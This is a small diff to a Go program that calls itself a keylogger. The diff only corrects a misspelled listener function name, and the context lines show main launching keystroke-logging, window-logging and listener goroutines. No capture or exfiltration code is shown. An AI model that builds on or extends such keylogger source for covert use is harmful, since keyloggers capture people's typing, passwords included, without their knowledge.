@@ -294,7 +294,7 @@ func keyLogger() {
 	}
 }
 
-func keyLoggetListener() {
+func keyLoggerListener() {
 	for {
 		time.Sleep(1 * time.Millisecond)
 		select {
@@ -311,6 +311,6 @@ func main() {
 	fmt.Println("Starting KeyLogger!")
 	go keyLogger()
 	go windowLogger()
-	go keyLoggetListener()
+	go keyLoggerListener()
 	os.Stdin.Read([]byte{0})
 }
